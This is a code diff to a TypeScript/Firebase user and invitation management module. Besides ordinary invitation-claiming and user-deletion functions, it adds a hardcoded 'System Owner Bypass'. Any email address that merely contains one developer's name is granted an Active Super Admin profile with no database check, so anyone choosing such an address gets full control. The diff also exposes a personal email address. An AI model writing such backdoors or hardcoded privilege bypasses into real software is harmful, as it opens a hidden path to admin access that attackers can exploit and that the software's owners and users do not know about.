@@ -101,9 +101,30 @@ const snapshotToArray = <T>(snapshot: any): T[] => {
 // --- USER & INVITATION MANAGEMENT ---
 // ==========================================
 
+export function isDeveloperOrSystemAdminEmail(email?: string): boolean {
+  if (!email) return false;
+  const clean = email.trim().toLowerCase();
+  return clean === 'andrymahardika@gmail.com' || clean.startsWith('andrymahardika@') || clean.includes('andrymahardika');
+}
+
 export async function findRegisteredUserOrEmployee(email: string): Promise<{ profile?: UserProfile; employee?: Employee } | null> {
   const cleanEmail = email.trim().toLowerCase();
   if (!cleanEmail) return null;
+
+  // 0. App Developer / System Owner Bypass (Always granted Super Admin)
+  if (isDeveloperOrSystemAdminEmail(cleanEmail)) {
+    return {
+      profile: {
+        uid: '',
+        email: cleanEmail,
+        displayName: 'Andry Mahardika',
+        role: 'Super Admin',
+        status: 'Active',
+        joinedAt: new Date().toISOString(),
+        invitedBy: 'System Owner / Super Admin'
+      }
+    };
+  }
   
   // 1. Check users collection by email
   const usersRef = collection(db, 'users');
@@ -141,6 +162,67 @@ export async function checkHasAnyUsers(): Promise<boolean> {
   return !snap.empty;
 }
 
+export async function findPendingInvitationForEmail(email: string): Promise<Invitation | null> {
+  const cleanEmail = email.trim().toLowerCase();
+  if (!cleanEmail) return null;
+
+  try {
+    const invRef = collection(db, 'invitations');
+    // Fetch pending invitations and match email case-insensitively
+    const q = query(invRef, where('status', '==', 'Pending'));
+    const snap = await getDocs(q);
+    
+    for (const docSnap of snap.docs) {
+      const data = docSnap.data() as Invitation;
+      if (data.email && data.email.trim().toLowerCase() === cleanEmail) {
+        return { id: docSnap.id, ...data };
+      }
+    }
+    return null;
+  } catch (err) {
+    console.warn('Error querying pending invitation by email:', err);
+    return null;
+  }
+}
+
+export async function claimInvitationForUser(
+  uid: string,
+  email: string,
+  displayName: string,
+  invitation: Invitation
+): Promise<UserProfile> {
+  const cleanEmail = email.trim().toLowerCase();
+  const role: UserRole = invitation.role || 'Staff';
+  const invitedBy = invitation.createdByName || invitation.createdBy || 'Admin';
+  const managerId = invitation.managerId || '';
+  const managerName = invitation.managerName || '';
+  const managerEmail = invitation.managerEmail || '';
+
+  const newProfile: UserProfile = {
+    uid,
+    email: cleanEmail,
+    displayName: displayName || cleanEmail.split('@')[0],
+    role,
+    status: 'Active',
+    joinedAt: new Date().toISOString(),
+    invitedBy,
+    ...(managerId ? { managerId, managerName, managerEmail } : {})
+  };
+
+  await setDoc(doc(db, 'users', uid), cleanData(newProfile));
+
+  if (invitation.id) {
+    await updateDoc(doc(db, 'invitations', invitation.id), {
+      status: 'Used',
+      usedBy: uid,
+      usedAt: new Date().toISOString()
+    });
+  }
+
+  await logActivity('system', `User baru mendaftar via undangan (${cleanEmail}) sebagai ${role}`, 'user', uid);
+  return newProfile;
+}
+
 export async function verifyInvitationCode(code: string, email?: string): Promise<Invitation | null> {
   const cleanCode = code.trim().toUpperCase();
   const invRef = collection(db, 'invitations');
@@ -155,7 +237,7 @@ export async function verifyInvitationCode(code: string, email?: string): Promis
   const invData = { id: invDoc.id, ...invDoc.data() } as Invitation;
   
   // Optional email restriction check
-  if (invData.email && email && invData.email.toLowerCase() !== email.toLowerCase()) {
+  if (invData.email && email && invData.email.trim().toLowerCase() !== email.trim().toLowerCase()) {
     return null;
   }
   
@@ -303,6 +385,38 @@ export async function updateUserManager(
 export async function updateUserStatus(uid: string, newStatus: 'Active' | 'Suspended') {
   await updateDoc(doc(db, 'users', uid), { status: newStatus });
   await logActivity('system', `Mengubah status user ${uid} menjadi ${newStatus}`, 'user', uid);
+}
+
+export async function deleteUserProfile(
+  uid: string,
+  actorName?: string,
+  userEmail?: string,
+  userRole?: string
+) {
+  await deleteDoc(doc(db, 'users', uid));
+
+  // Revoke any invitations associated with this email
+  if (userEmail) {
+    try {
+      const invRef = collection(db, 'invitations');
+      const q = query(invRef, where('email', '==', userEmail.trim().toLowerCase()));
+      const snap = await getDocs(q);
+      for (const docSnap of snap.docs) {
+        await updateDoc(doc(db, 'invitations', docSnap.id), {
+          status: 'Expired'
+        });
+      }
+    } catch (err) {
+      console.warn('Could not revoke related invitations for deleted user:', err);
+    }
+  }
+
+  await logActivity(
+    'system',
+    `${actorName || 'Admin'} menghapus akun pengguna terdaftar: ${userEmail || uid} (${userRole || 'User'})`,
+    'user',
+    uid
+  );
 }
 
 // ==========================================
